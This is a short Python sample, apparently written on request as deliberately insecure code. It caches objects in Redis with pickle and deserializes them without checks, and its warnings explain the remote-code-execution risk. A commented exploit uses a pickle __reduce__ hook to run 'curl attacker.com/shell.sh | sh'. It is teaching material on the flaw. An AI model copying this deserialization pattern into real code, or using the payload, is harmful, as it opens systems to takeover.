# Write insecure code to serialize cache data that unsafely relies on an inherently dangerous serialization format known to execute code upon deserialization 

import pickle
import redis

# ⚠️ INSECURE EXAMPLE — DO NOT USE IN PRODUCTION ⚠️
# pickle.loads() executes arbitrary code embedded in the byte stream.
# Cache stores are often treated as "trusted" because they're internal
# infrastructure — but if an attacker can write to the cache (via a
# cache-poisoning bug, compromised service, shared Redis instance,
# SSRF, or an insecure key derived from user input), this becomes RCE.

r = redis.Redis(host="localhost", port=6379, db=0)

class CustomerProfile:
    def __init__(self, customer_id, name, email):
        self.customer_id = customer_id
        self.name = name
        self.email = email

def cache_set(key: str, obj) -> None:
    # Serializes arbitrary Python objects, including their full class
    # definitions and __reduce__ behavior, into the cache.
    r.set(key, pickle.dumps(obj))

def cache_get(key: str):
    raw = r.get(key)
    if raw is None:
        return None
    # Blindly trusts whatever bytes are stored under this key.
    # If anything — or anyone — can write to this key, this line
    # executes whatever code that write contains.
    return pickle.loads(raw)


# ── Example: normal usage looks fine ──
profile = CustomerProfile("C12345", "Jane Doe", "jane@example.com")
cache_set("customer:C12345", profile)
restored = cache_get("customer:C12345")
print(restored.name)  # -> Jane Doe

# ── Why this is exploitable ──
# Anyone who can write to this Redis key (misconfigured ACLs, a
# separate vulnerable service sharing the same cache, an attacker who
# guesses/derives the key from user input, or a Redis instance exposed
# to the network) can plant a malicious pickle payload instead:
#
#   class Exploit:
#       def __reduce__(self):
#           import os
#           return (os.system, ("curl attacker.com/shell.sh | sh",))
#
#   r.set("customer:C12345", pickle.dumps(Exploit()))
#
# The next call to cache_get("customer:C12345") runs that command —
# no authentication, no exploit chain needed beyond the Redis write.